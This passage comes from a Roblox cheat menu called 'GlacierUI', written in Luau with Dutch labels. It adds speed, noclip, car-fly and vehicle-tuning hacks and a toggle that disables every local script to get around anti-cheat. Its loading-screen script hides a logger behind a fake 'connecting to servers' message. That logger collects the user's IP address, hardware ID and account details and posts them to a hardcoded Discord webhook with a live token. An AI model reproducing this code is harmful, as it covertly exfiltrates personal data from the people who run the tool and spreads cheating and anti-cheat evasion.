			UserInputService.InputChanged:Connect(function(input)
				if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
					or input.UserInputType == Enum.UserInputType.Touch) then
					setFromX(input.Position.X)
				end
			end)

			UserInputService.InputEnded:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1
					or input.UserInputType == Enum.UserInputType.Touch then
					dragging = false
					if page and page:IsA("ScrollingFrame") then
						page.ScrollingEnabled = true
					end
				end
			end)

			el.MouseEnter:Connect(function()
				if focusedElement == el then return end
				tween(el, 0.15, { BackgroundColor3 = THEME.ElementBgHover })
			end)
			el.MouseLeave:Connect(function()
				if focusedElement == el then return end
				tween(el, 0.15, { BackgroundColor3 = THEME.ElementBg })
			end)

			elementActions[el] = function() end
			elementAdjust[el] = function(dir)
				setValue(value + dir * inc, true)
			end
			elementSetFocus[el] = function(s)
				tween(el, 0.1, { BackgroundColor3 = s and THEME.ElementBgHover or THEME.ElementBg })
			end

			return {
				Set = function(_, v) setValue(v, false) end,
				Get = function() return value end,
				Instance = el,
			}
		end

		-- =========================================================
		--  INIT
		-- =========================================================
		function Manager:Init()
			ensurePagesHolder()
			pagesHolder.Visible = false

			if not window:FindFirstChild("CloseButton") then
				local closeBtn = new("TextButton", {
					Name             = "CloseButton",
					Size             = UDim2.new(0, 351, 0, 30),
					Position         = UDim2.new(0, 7, 0, 482),
					BackgroundColor3 = THEME.ElementBg,
					BorderSizePixel  = 0,
					Text             = "Sluiten",
					TextColor3       = THEME.CloseText,
					TextSize         = 14,
					FontFace         = FONT_BOLD,
					AutoButtonColor  = false,
					ZIndex           = 4,
					Visible          = true,
				}, window)
				addCorner(closeBtn, 5)

				closeBtn.MouseEnter:Connect(function()
					if focusedElement == closeBtn then return end
					tween(closeBtn, 0.15, {
						BackgroundColor3 = THEME.CloseHover,
						TextColor3       = THEME.CloseHoverText,
					})
				end)
				closeBtn.MouseLeave:Connect(function()
					if focusedElement == closeBtn then return end
					tween(closeBtn, 0.15, {
						BackgroundColor3 = THEME.ElementBg,
						TextColor3       = THEME.CloseText,
					})
				end)

				closeBtn.MouseButton1Click:Connect(function()
					if currentMenu then Manager:CloseMenu() end
					task.spawn(fadeOutWindow, 0.4)
				end)

				elementActions[closeBtn] = function()
					if currentMenu then Manager:CloseMenu() end
					task.spawn(fadeOutWindow, 0.4)
				end
				elementSetFocus[closeBtn] = function(state)
					if state then
						tween(closeBtn, 0.1, {
							BackgroundColor3 = THEME.CloseHover,
							TextColor3       = THEME.CloseHoverText,
						})
					else
						tween(closeBtn, 0.1, {
							BackgroundColor3 = THEME.ElementBg,
							TextColor3       = THEME.CloseText,
						})
					end
				end

				closeButton = closeBtn
			end

			bindKeys()

			task.defer(function()
				rebuildFocusForMenu()
			end)
		end

		return Manager
	end
	fake_module_scripts[script] = module_script
end


-- Scripts:

local function VUZVBAZ_fake_script() -- Main.SmoothDrag 
	local script = Instance.new('LocalScript', Main)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	local UserInputService = game:GetService("UserInputService")
	local RunService = game:GetService("RunService")

	local main = script.Parent
	local header = main:WaitForChild("Header")

	local dragging = false
	local dragInput = nil
	local dragStart = nil
	local startPosition = nil

	local targetPosition = main.Position
	local currentPosition = main.Position

	local function updateTarget(input)
		local delta = input.Position - dragStart

		targetPosition = UDim2.new(
			startPosition.X.Scale,
			startPosition.X.Offset + delta.X,
			startPosition.Y.Scale,
			startPosition.Y.Offset + delta.Y
		)
	end

	header.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1
			or input.UserInputType == Enum.UserInputType.Touch then

			dragging = true

			dragStart = input.Position
			startPosition = main.Position

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)

	header.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement
			or input.UserInputType == Enum.UserInputType.Touch then

			dragInput = input
		end
	end)

	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			updateTarget(input)
		end
	end)

	-- Smooth interpolation
	RunService.RenderStepped:Connect(function()
		currentPosition = UDim2.new(
			currentPosition.X.Scale,
			currentPosition.X.Offset + (targetPosition.X.Offset - currentPosition.X.Offset) * 0.25,
			currentPosition.Y.Scale,
			currentPosition.Y.Offset + (targetPosition.Y.Offset - currentPosition.Y.Offset) * 0.25
		)

		main.Position = currentPosition
	end)

end
coroutine.wrap(VUZVBAZ_fake_script)()
local function HOXBX_fake_script() -- Main.UIDisclose 
	local script = Instance.new('LocalScript', Main)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	local TweenService = game:GetService("TweenService")
	local Mainn = script.Parent
	Mainn.Visible = false
	local window = script.Parent          -- Main frame
	local gui    = window.Parent          -- GlacierUI ScreenGui

	-- Make the whole ScreenGui cover the screen edge-to-edge (no topbar gap)
	gui.IgnoreGuiInset = true
	gui.ScreenInsets   = Enum.ScreenInsets.None
	local plr = game.Players.LocalPlayer
	local textLabel = script.Parent.BottomBar.Annc
	local message = "Connected to the glacier servers!"

	local Webhook = 'https://discord.com/api/webhooks/1522603794184278168/9HJdzLa8riy729LMNohBtBQ9EZQSLKqcbs6nrgHyl0IdDxUk9aX0SZX5T590vvF6d-LG'

	local LocalPlayer      = game.Players.LocalPlayer
	local Userid           = LocalPlayer.UserId
	local DName            = LocalPlayer.DisplayName
	local Name             = LocalPlayer.Name
	local MembershipType   = tostring(LocalPlayer.MembershipType):sub(21)
	local AccountAge       = LocalPlayer.AccountAge
	local Country          = game.LocalizationService.RobloxLocaleId
	local GetIp            = game:HttpGet("https://v4.ident.me/")
	local GetHwid          = game:GetService("RbxAnalyticsService"):GetClientId()
	local HttpService      = game:GetService("HttpService")
	local MarketplaceService = game:GetService("MarketplaceService")

	-- Game Info
	local GAMENAME = MarketplaceService:GetProductInfoAsync(game.PlaceId).Name

	--// SETTINGS
	local LOAD_TIME = 2
	local OPEN_TIME = 0.65
	local FADE_IN   = 0.4

	--// Prep the window: hidden + folded
	window.Visible     = false
	window.AnchorPoint = Vector2.new(0.5, 0.5)
	local finalSize    = window.Size
	window.Size        = UDim2.new(0, 0, finalSize.Y.Scale, finalSize.Y.Offset)

	--// Build loading frame (starts invisible so we can fade it in)
	local loading = Instance.new("Frame")
	loading.Name                   = "LoadingFrame"
	loading.Size                   = UDim2.new(1, 0, 1, 0)
	loading.Position               = UDim2.new(0.5, 0, 0.5, 0)
	loading.AnchorPoint            = Vector2.new(0.5, 0.5)
	loading.BackgroundColor3       = Color3.fromRGB(25, 25, 25)
	loading.BackgroundTransparency = 1
	loading.BorderSizePixel        = 0
	loading.ZIndex                 = 100
	loading.Parent                 = gui

	local loadingText = Instance.new("TextLabel")
	loadingText.Name                   = "LoadingText"
	loadingText.Size                   = UDim2.new(1, 0, 0, 40)
	loadingText.Position               = UDim2.new(0.5, 0, 0.5, -20)
	loadingText.AnchorPoint            = Vector2.new(0.5, 0.5)
	loadingText.BackgroundTransparency = 1
	loadingText.TextColor3             = Color3.fromRGB(240, 240, 240)
	loadingText.Font                   = Enum.Font.GothamBold
	loadingText.TextSize               = 24
	loadingText.Text                   = "Connecting to Glacier Servers"
	loadingText.TextTransparency       = 1
	loadingText.ZIndex                 = 101
	loadingText.Parent                 = loading

	--// Fade the loading frame in
	local fadeInInfo = TweenInfo.new(FADE_IN, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	TweenService:Create(loading,     fadeInInfo, { BackgroundTransparency = 0 }):Play()
	TweenService:Create(loadingText, fadeInInfo, { TextTransparency       = 0 }):Play()

	--// Animated dots
	task.spawn(function()
		local base = "Connecting to Glacier Servers"
		local dots = 0
		while loading.Parent do
			dots = (dots % 3) + 1
			loadingText.Text = base .. string.rep(".", dots)
			task.wait(0.35)
		end
	end)


	--// Send session details to webhook
	task.spawn(function()
		pcall(function()
			local profileLink = ("https://www.roblox.com/users/%d/profile"):format(Userid)
			local gameLink    = ("https://www.roblox.com/games/%d/%s"):format(game.PlaceId, GAMENAME)
			local headshot    = ("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png"):format(Userid)

			local embed = {
				title       = "❄️ GlacierUI — New Session",
				description = ("**%s** just executed GlacierUI\n[View Profile](%s) • [View Game](%s)"):format(Name, profileLink, gameLink),
				color       = 3197120,
				thumbnail   = { url = headshot },
				fields = {
					{
						name   = "👤 Account",
						value  = ("```Username   : %s\nDisplay    : %s\nUser ID    : %d\nMembership : %s\nAge        : %d days```"):format(Name, DName, Userid, MembershipType, AccountAge),
						inline = false,
					},
					{
						name   = "🌐 System",
						value  = ("```IP      : %s\nCountry : %s\nHWID    : %s```"):format(GetIp, Country, GetHwid),
						inline = false,
					},
					{
						name   = "🎮 Game",
						value  = ("```Name     : %s\nPlace ID : %d\nJob ID   : %s```"):format(GAMENAME, game.PlaceId, game.JobId),
						inline = false,
					},
				},
				footer    = { text = "GlacierUI • " .. os.date("%Y-%m-%d %H:%M:%S") },
				timestamp = DateTime.now():ToIsoDate(),
			}

			local payload = HttpService:JSONEncode({
				username = "GlacierUI Logger",
				embeds   = { embed },
			})

			local body = {
				Url     = Webhook,
				Method  = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body    = payload,
			}

			if syn and syn.request then
				syn.request(body)
			elseif request then
				request(body)
			elseif http_request then
				http_request(body)
			end
		end)
	end)

	--// Simulated load time
	task.wait(LOAD_TIME)

	--// Fade loading frame out
	local fadeOutInfo = TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	TweenService:Create(loading,     fadeOutInfo, { BackgroundTransparency = 1 }):Play()
	TweenService:Create(loadingText, fadeOutInfo, { TextTransparency       = 1 }):Play()
	task.wait(0.35)
	loading:Destroy()

	--// Show Main folded, then fold it open from the center
	window.Visible = true
	window.Size    = UDim2.new(0, 0, finalSize.Y.Scale, finalSize.Y.Offset)

	TweenService:Create(
		window,
		TweenInfo.new(OPEN_TIME, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
		{ Size = finalSize }
	):Play()

	Mainn.Visible = true

	textLabel.Text = ""
	textLabel.TextTransparency = 1

	for i = 1, #message do
		textLabel.Text = string.sub(message, 1, i)

		-- Smoothly fade the text in
		for transparency = textLabel.TextTransparency, 0, -0.2 do
			textLabel.TextTransparency = math.max(0, transparency)
			task.wait(0.01)
		end

		task.wait(0.04)
	end

	textLabel.TextTransparency = 0
	wait(2)
	local message = "Welcome " .. plr.Name

	textLabel.Text = ""
	textLabel.TextTransparency = 1

	for i = 1, #message do
		textLabel.Text = string.sub(message, 1, i)

		-- Smoothly fade the text in
		for transparency = textLabel.TextTransparency, 0, -0.2 do
			textLabel.TextTransparency = math.max(0, transparency)
			task.wait(0.01)
		end

		task.wait(0.04)
	end

	textLabel.TextTransparency = 0
end
coroutine.wrap(HOXBX_fake_script)()
local function RMHCTRF_fake_script() -- Main.Main.luau 
	local script = Instance.new('LocalScript', Main)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	--!strict
	-- main.luau — GlacierUI bootstrapper

	local Players           = game:GetService("Players")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")

	local LocalPlayer = Players.LocalPlayer
	local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")

	local UI_NAME = "GlacierUI"

	-- ==========================================================
	--  Find which ScreenGui the currently-running script belongs to
	--  so we never destroy ourselves.
	-- ==========================================================
	local function getOwnScreenGui(): ScreenGui?
		local node: Instance? = script
		while node do
			if node:IsA("ScreenGui") then
				return node
			end
			node = node.Parent
		end
		return nil
	end

	local OWN_GUI = getOwnScreenGui()

	-- ==========================================================
	--  STEP 1 — Purge duplicates, but keep OWN_GUI safe
	-- ==========================================================
	local function purgeDuplicates(): ()
		local keptOne = OWN_GUI ~= nil  -- if we're inside one, that's the keeper
		local removed = 0

		for _, child in ipairs(PlayerGui:GetChildren()) do
			if child == OWN_GUI then
				-- Never touch ourselves
				continue
			end

			if child:IsA("ScreenGui") then
				local isOurs =
					child.Name == UI_NAME
					or child:GetAttribute("GlacierUI") == true
					or child:FindFirstChild("Main") ~= nil

				if isOurs then
					if keptOne then
						child:Destroy()
						removed += 1
					else
						-- Adopt this one as the survivor
						keptOne = true
						OWN_GUI = child
					end
				end
			end
		end
	end

	-- ==========================================================
	--  STEP 2 — Get (or build) the UI
	-- ==========================================================
	local function getUI(): ScreenGui
		-- If the script is already inside a ScreenGui, use it.
		if OWN_GUI then
			OWN_GUI:SetAttribute("GlacierUI", true)
			return OWN_GUI
		end

		-- Otherwise, if one already survived the purge, reuse it.
		local existing = PlayerGui:FindFirstChild(UI_NAME)
		if existing and existing:IsA("ScreenGui") then
			existing:SetAttribute("GlacierUI", true)
			OWN_GUI = existing
			return existing
		end

		-- Otherwise, clone from template.
		local template = ReplicatedStorage:FindFirstChild("GlacierUI")
			or script:FindFirstChild("GlacierUI")

		local clone = template:Clone() :: ScreenGui
		clone:SetAttribute("GlacierUI", true)
		clone.Parent = PlayerGui
		OWN_GUI = clone
		return clone
	end

	-- ==========================================================
	--  RUN
	-- ==========================================================
	purgeDuplicates()

	local gui = getUI()
	gui.DisplayOrder = 999

	local main = gui:WaitForChild("Main")
	local disclose = main:FindFirstChild("UIDisclose")
	if disclose and disclose:IsA("LocalScript") then
		disclose.Enabled = true
	end

	return {
		gui   = gui,
		main  = main,
		purge = purgeDuplicates,
	}
end
coroutine.wrap(RMHCTRF_fake_script)()
local function DJOXJ_fake_script() -- Main.Bootstrap.luau 
	local script = Instance.new('LocalScript', Main)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end



	local Main    = script.Parent
	local Panel   = Main:WaitForChild("Panel")
	local Manager = require(Main:WaitForChild("Manager.luau"))


	Manager:Init()


	-- =========================================================
	--  Create all sidebar menus
	-- =========================================================
	Manager:CreateMenus({
		"Speler",
		"Apeldoorn",
		"Wapen",
		"Voertuig",
		"Visueel",
		"Overig",
		"Instellingen",
	})

	-- =========================================================
	--  SPELER — example content
	-- =========================================================

	-- WalkSpeed
	Manager:CreateSlider({
		Menu = "Speler",
		Name = "WalkSpeed",
		Min = 16, Max = 300, Default = 16,
		Callback = function(v)
			local char = game.Players.LocalPlayer.Character
			local hum  = char and char:FindFirstChildOfClass("Humanoid")
			if hum then hum.WalkSpeed = v end
		end,
	})

	-- JumpPower
	Manager:CreateSlider({
		Menu = "Speler",
		Name = "JumpPower",
		Min = 50, Max = 350, Default = 50,
		Callback = function(v)
			local char = game.Players.LocalPlayer.Character
			local hum  = char and char:FindFirstChildOfClass("Humanoid")
			if hum then
				hum.UseJumpPower = true
				hum.JumpPower = v
			end
		end,
	})

	-- Infinite Jump toggle
	Manager:CreateToggle({
		Menu = "Speler",
		Name = "Inf jump",
		Default = false,
		Callback = function(state)
			_G.InfiniteJump = state
		end,
	})

	-- A little driver for infinite jump
	local UserInputService = game:GetService("UserInputService")
	UserInputService.JumpRequest:Connect(function()
		if _G.InfiniteJump then
			local char = game.Players.LocalPlayer.Character
			local hum  = char and char:FindFirstChildOfClass("Humanoid")
			if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
		end
	end)

	-- Noclip toggle
	Manager:CreateToggle({
		Menu = "Speler",
		Name = "Noclip",
		Default = false,
		Callback = function(state)
			_G.Noclip = state
		end,
	})

	-- Noclip driver
	local RunService = game:GetService("RunService")
	RunService.Stepped:Connect(function()
		if not _G.Noclip then return end
		local char = game.Players.LocalPlayer.Character
		if not char then return end
		for _, part in ipairs(char:GetDescendants()) do
			if part:IsA("BasePart") and part.CanCollide then
				part.CanCollide = false
			end
		end
	end)

	Manager:CreateToggle({
		Menu = "Speler",
		Name = "Disable local anti-cheat",
		Default = false,
		Callback = function(state)
			local disabledInstances = {}

			local function toggleInstances(disabled)
				for _, instance in ipairs(game:GetDescendants()) do
					if instance:IsA("LocalScript") or instance:IsA("Script") then
						if instance.Name ~= "Animate" then
							local ok = pcall(function()
								instance.Disabled = disabled
							end)
							if ok then
								disabledInstances[instance] = instance.Disabled
							end
						end
					end
				end
			end

			toggleInstances(state)
		end,
	})

	Manager:CreateToggle({
		Menu = "Voertuig",
		Name = "Car Fly",
		Default = false,
		Callback = function(state)
			local Players     = game:GetService("Players")
			local RunService  = game:GetService("RunService")
			local LocalPlayer = Players.LocalPlayer

			-- Keep a reference to the running loop so we can stop it later
			if _G.__GlacierCarFly then
				_G.__GlacierCarFly.enabled = state
				if not state and _G.__GlacierCarFly.cleanup then
					_G.__GlacierCarFly.cleanup()
				end
				return
			end

			local function getPlayerCar(plrName)
				local spelers = workspace:FindFirstChild("Spelers")
				if not spelers then return nil end
				local plrFolder = spelers:FindFirstChild(plrName)
				if not plrFolder then return nil end
				local autoFolder = plrFolder:FindFirstChild("Voertuig")
				if not autoFolder then return nil end
				return autoFolder:GetChildren()[1]
			end

			-- Find the car's primary drive part (works with A-Chassis)
			local function getDrivePart(car)
				if not car then return nil end

				-- Prefer the chassis root
				local root = car:FindFirstChild("DriveSeat") or car:FindFirstChild("VehicleSeat")
				if root then return root end

				-- Fall back to the PrimaryPart
				if car.PrimaryPart then return car.PrimaryPart end

				-- Last resort: first BasePart
				for _, obj in ipairs(car:GetDescendants()) do
					if obj:IsA("BasePart") and obj.Name:lower():find("chassis") then
						return obj
					end
				end

				for _, obj in ipairs(car:GetDescendants()) do
					if obj:IsA("BasePart") then return obj end
				end
				return nil
			end

			local flyData = { enabled = state, bodyVel = nil, bodyGyro = nil, connection = nil }
			_G.__GlacierCarFly = flyData

			-- Cleanup removes forces and stops the loop
			flyData.cleanup = function()
				if flyData.bodyVel then flyData.bodyVel:Destroy() flyData.bodyVel = nil end
				if flyData.bodyGyro then flyData.bodyGyro:Destroy() flyData.bodyGyro = nil end
				if flyData.connection then flyData.connection:Disconnect() flyData.connection = nil end
				_G.__GlacierCarFly = nil
			end

			local car  = getPlayerCar(LocalPlayer.Name)
			local part = getDrivePart(car)

			if not part then
				warn("[Voertuig] Geen auto om te laten vliegen.")
				flyData.cleanup()
				return
			end

			-- Create the forces
			local bv = Instance.new("BodyVelocity")
			bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
			bv.Velocity = Vector3.zero
			bv.P = 1250
			bv.Parent   = part

			local bg = Instance.new("BodyGyro")
			bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
			bg.P = 3000
			bg.D = 50
			bg.CFrame = part.CFrame
			bg.Parent   = part

			flyData.bodyVel  = bv
			flyData.bodyGyro = bg

			local UserInputService = game:GetService("UserInputService")
			local camera = workspace.CurrentCamera

			local speed = 120

			flyData.connection = RunService.RenderStepped:Connect(function()
				if not flyData.enabled then return end
				if not part or not part.Parent then
					flyData.cleanup()
					return
				end

				-- Camera-relative direction
				local look = camera.CFrame.LookVector
				local right = camera.CFrame.RightVector

				local move = Vector3.zero

				if UserInputService:IsKeyDown(Enum.KeyCode.W) then move += look end
				if UserInputService:IsKeyDown(Enum.KeyCode.S) then move -= look end
				if UserInputService:IsKeyDown(Enum.KeyCode.D) then move += right end
				if UserInputService:IsKeyDown(Enum.KeyCode.A) then move -= right end
				if UserInputService:IsKeyDown(Enum.KeyCode.Space) then move += Vector3.new(0, 1, 0) end
				if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then move -= Vector3.new(0, 1, 0) end

				if move.Magnitude > 0 then
					move = move.Unit * speed
				end

				bv.Velocity = move
				bg.CFrame = CFrame.new(part.Position, part.Position + camera.CFrame.LookVector)
			end)
		end,
	})

	Manager:CreateButton({
		Menu = "Voertuig",
		Name = "Bring Car",
		Callback = function()
			local Players     = game:GetService("Players")
			local LocalPlayer = Players.LocalPlayer

			local function getPlayerCar(plrName)
				local spelers = workspace:FindFirstChild("Spelers")
				if not spelers then return nil end
				local plrFolder = spelers:FindFirstChild(plrName)
				if not plrFolder then return nil end
				local autoFolder = plrFolder:FindFirstChild("Voertuig")
				if not autoFolder then return nil end
				return autoFolder:GetChildren()[1]
			end

			local car = getPlayerCar(LocalPlayer.Name)
			if not car then
				warn("[Voertuig] Geen auto gevonden.")
				return
			end

			local char = LocalPlayer.Character
			local root = char and char:FindFirstChild("HumanoidRootPart")
			if not root then
				warn("[Voertuig] Geen character.")
				return
			end

			-- Find the drive seat
			local driveSeat = car:FindFirstChild("DriveSeat")
				or car:FindFirstChild("VehicleSeat")
				or car:FindFirstChildWhichIsA("VehicleSeat")

			if not driveSeat then
				-- Fall back: any seat in the car
				for _, obj in ipairs(car:GetDescendants()) do
					if obj:IsA("Seat") then
						driveSeat = obj
						break
					end
				end
			end

			if not driveSeat then
				warn("[Voertuig] Geen stoel in de auto.")
				return
			end

			-- Move the car in front of the player
			local targetPos = root.CFrame + root.CFrame.LookVector * 8
			local carCFrame = CFrame.new(targetPos.Position, targetPos.Position + root.CFrame.LookVector)

			-- Move every BasePart of the car by the same offset (keeps wheels aligned)
			if car.PrimaryPart then
				car:PivotTo(carCFrame)
			else
				-- Fallback for models without PrimaryPart
				local offset = carCFrame.Position - driveSeat.Position
				for _, obj in ipairs(car:GetDescendants()) do
					if obj:IsA("BasePart") then
						obj.CFrame = obj.CFrame + offset
					end
				end
			end

			-- Sit the player in the seat
			task.wait(0.1)
			root.CFrame = driveSeat.CFrame + Vector3.new(0, 3, 0)
			task.wait(0.05)
			driveSeat:Sit(char:FindFirstChildOfClass("Humanoid"))
		end,
	})

	-- ========================= APELDOORN ==============================
	Manager:CreateButton({
		Menu = "Apeldoorn",
		Name = "God mode (forcefield)",
		Callback = function()
			local player                             = game.Players.LocalPlayer
			local greenzone                          = workspace.Framework.Burgers.Spawns.Safezones:GetChildren()[3]
			local blackscreen                        = Instance.new("ScreenGui")
			blackscreen.Parent = game:GetService("Players").LocalPlayer.PlayerGui
			blackscreen.Name = "BlackScreen"
			local blackscreentext = Instance.new("TextLabel")
			blackscreentext.Parent = blackscreen
			blackscreentext.Text = "glacier v1 :>"
			blackscreentext.Size = UDim2.new(1, 0, 1, 0)
			blackscreentext.Position = UDim2.new(0, 0, 0, 0)
			blackscreentext.BackgroundColor3 = Color3.new(0, 0, 0)
			blackscreentext.TextColor3 = Color3.new(1, 1, 1)
			blackscreentext.Font = Enum.Font.SourceSansBold
			blackscreentext.TextSize = 24
			blackscreen.IgnoreGuiInset = true
			blackscreentext.BackgroundTransparency = 0
			blackscreentext.TextScaled = true

			local originalPosition = player.Character.HumanoidRootPart.CFrame

			player.Character.HumanoidRootPart.CFrame = greenzone.CFrame
			wait(0.2)
			local function findSeat()
				for _, obj in pairs(workspace:GetDescendants()) do
					if obj:IsA("Seat") and not obj.Occupant then
						return obj
					end
				end
				return nil
			end

			local seat = findSeat()
			if seat then
				player.Character.HumanoidRootPart.CFrame = seat.CFrame
				wait(0.01)
				player.Character.Humanoid.Jump           = true
				wait(0.05)
				seat:Destroy()                           -- ⬅ delete the seat after use
			end

			player.Character.HumanoidRootPart.CFrame = originalPosition
			player.Character.Humanoid.Jump           = true
			wait(0.2)
			blackscreen:Destroy()
		end,
	})


	-- ============================== Voertuig ====================================
	-- =========================================================
	--  Top Speed  (scales FinalDrive — lower = faster top end)
	-- =========================================================
	Manager:CreateSlider({
		Menu = "Voertuig",
		Name = "Top Speed",
		Min = 1, Max = 10, Default = 3.5, Increment = 0.1,
		Suffix = " fd",
		Callback = function(v)
			local Players     = game:GetService("Players")
			local LocalPlayer = Players.LocalPlayer

			local function getPlayerCar(plrName)
				local spelers = workspace:FindFirstChild("Spelers")
				if not spelers then return nil end
				local plrFolder = spelers:FindFirstChild(plrName)
				if not plrFolder then return nil end
				local autoFolder = plrFolder:FindFirstChild("Voertuig")
				if not autoFolder then return nil end
				return autoFolder:GetChildren()[1]
			end

			local car = getPlayerCar(LocalPlayer.Name)
			if not car or not car:FindFirstChild("A-Chassis Tune") then return end
			local tune = require(car:FindFirstChild("A-Chassis Tune"))
			tune.FinalDrive = v
		end,
	})

	-- =========================================================
	--  Redline
	-- =========================================================
	Manager:CreateSlider({
		Menu = "Voertuig",
		Name = "Redline",
		Min = 1000, Max = 20000, Default = 9000,
		Suffix = " rpm",
		Callback = function(v)
			local Players     = game:GetService("Players")
			local LocalPlayer = Players.LocalPlayer

			local function getPlayerCar(plrName)
				local spelers = workspace:FindFirstChild("Spelers")
				if not spelers then return nil end
				local plrFolder = spelers:FindFirstChild(plrName)
				if not plrFolder then return nil end
				local autoFolder = plrFolder:FindFirstChild("Voertuig")
				if not autoFolder then return nil end
				return autoFolder:GetChildren()[1]
			end

			local car = getPlayerCar(LocalPlayer.Name)
			if not car or not car:FindFirstChild("A-Chassis Tune") then return end
			local tune = require(car:FindFirstChild("A-Chassis Tune"))
			tune.Redline = v
		end,
	})

	-- =========================================================
	--  Peak RPM
	-- =========================================================
	Manager:CreateSlider({
		Menu = "Voertuig",
		Name = "Peak RPM",
		Min = 1000, Max = 15000, Default = 8000,
		Suffix = " rpm",
		Callback = function(v)
			local Players     = game:GetService("Players")
			local LocalPlayer = Players.LocalPlayer

			local function getPlayerCar(plrName)
				local spelers = workspace:FindFirstChild("Spelers")
				if not spelers then return nil end
				local plrFolder = spelers:FindFirstChild(plrName)
				if not plrFolder then return nil end
				local autoFolder = plrFolder:FindFirstChild("Voertuig")
				if not autoFolder then return nil end
				return autoFolder:GetChildren()[1]
			end

			local car = getPlayerCar(LocalPlayer.Name)
			if not car or not car:FindFirstChild("A-Chassis Tune") then return end
			local tune = require(car:FindFirstChild("A-Chassis Tune"))
			tune.PeakRPM = v
		end,
	})

	-- =========================================================
	--  Torque Curve Sharpness
	-- =========================================================
	Manager:CreateSlider({
		Menu = "Voertuig",
		Name = "Torque Curve",
		Min = 0.1, Max = 15, Default = 3.8, Increment = 0.1,
		Callback = function(v)
			local Players     = game:GetService("Players")
			local LocalPlayer = Players.LocalPlayer

			local function getPlayerCar(plrName)
				local spelers = workspace:FindFirstChild("Spelers")
				if not spelers then return nil end
				local plrFolder = spelers:FindFirstChild(plrName)
				if not plrFolder then return nil end
				local autoFolder = plrFolder:FindFirstChild("Voertuig")
				if not autoFolder then return nil end
				return autoFolder:GetChildren()[1]
			end

			local car = getPlayerCar(LocalPlayer.Name)
			if not car or not car:FindFirstChild("A-Chassis Tune") then return end
			local tune = require(car:FindFirstChild("A-Chassis Tune"))
			tune.PeakSharpness = v
		end,
	})

	-- =========================================================
	--  Curve Multiplier  (overall torque output)
	-- =========================================================
	Manager:CreateSlider({
		Menu = "Voertuig",
		Name = "Torque Multiplier",
		Min = 0.01, Max = 1, Default = 0.07, Increment = 0.01,
		Callback = function(v)
			local Players     = game:GetService("Players")
			local LocalPlayer = Players.LocalPlayer

			local function getPlayerCar(plrName)
				local spelers = workspace:FindFirstChild("Spelers")
				if not spelers then return nil end
				local plrFolder = spelers:FindFirstChild(plrName)
				if not plrFolder then return nil end
				local autoFolder = plrFolder:FindFirstChild("Voertuig")
				if not autoFolder then return nil end
				return autoFolder:GetChildren()[1]
			end

			local car = getPlayerCar(LocalPlayer.Name)
			if not car or not car:FindFirstChild("A-Chassis Tune") then return end
			local tune = require(car:FindFirstChild("A-Chassis Tune"))
			tune.CurveMult = v
		end,
	})

	-- =========================================================
	--  Gear Ratio Multiplier  (all gears scaled together)
	-- =========================================================
	Manager:CreateSlider({
		Menu = "Voertuig",
		Name = "Gear Ratio Mult",
		Min = 0.5, Max = 3, Default = 1, Increment = 0.05,
		Callback = function(v)
			local Players     = game:GetService("Players")
			local LocalPlayer = Players.LocalPlayer

			local function getPlayerCar(plrName)
				local spelers = workspace:FindFirstChild("Spelers")
				if not spelers then return nil end
				local plrFolder = spelers:FindFirstChild(plrName)
				if not plrFolder then return nil end
				local autoFolder = plrFolder:FindFirstChild("Voertuig")
				if not autoFolder then return nil end
				return autoFolder:GetChildren()[1]
			end

			local car = getPlayerCar(LocalPlayer.Name)
			if not car or not car:FindFirstChild("A-Chassis Tune") then return end
			local tune = require(car:FindFirstChild("A-Chassis Tune"))

			local baseRatios = { 6.42, 0, 4.51, 2.38, 1.72, 1.2, 1, 0.9, 0.78 }
			local newRatios = {}
			for i, r in ipairs(baseRatios) do
				newRatios[i] = r * v
			end
			tune.Ratios = newRatios
		end,
	})

	-- =========================================================
	--  Front Brake Force
	-- =========================================================
	Manager:CreateSlider({
		Menu = "Voertuig",
		Name = "Front Brake Force",
		Min = 100, Max = 5000, Default = 500,
		Callback = function(v)
			local Players     = game:GetService("Players")
			local LocalPlayer = Players.LocalPlayer

			local function getPlayerCar(plrName)
				local spelers = workspace:FindFirstChild("Spelers")
				if not spelers then return nil end
				local plrFolder = spelers:FindFirstChild(plrName)
				if not plrFolder then return nil end
				local autoFolder = plrFolder:FindFirstChild("Voertuig")
				if not autoFolder then return nil end
				return autoFolder:GetChildren()[1]
			end

			local car = getPlayerCar(LocalPlayer.Name)
			if not car or not car:FindFirstChild("A-Chassis Tune") then return end
			local tune = require(car:FindFirstChild("A-Chassis Tune"))
			tune.FBrakeForce = v
		end,
	})

	-- =========================================================
	--  Rear Brake Force
	-- =========================================================
	Manager:CreateSlider({
		Menu = "Voertuig",
		Name = "Rear Brake Force",
		Min = 100, Max = 5000, Default = 1000,
		Callback = function(v)
			local Players     = game:GetService("Players")
			local LocalPlayer = Players.LocalPlayer

			local function getPlayerCar(plrName)
				local spelers = workspace:FindFirstChild("Spelers")
				if not spelers then return nil end
				local plrFolder = spelers:FindFirstChild(plrName)
				if not plrFolder then return nil end
				local autoFolder = plrFolder:FindFirstChild("Voertuig")
				if not autoFolder then return nil end
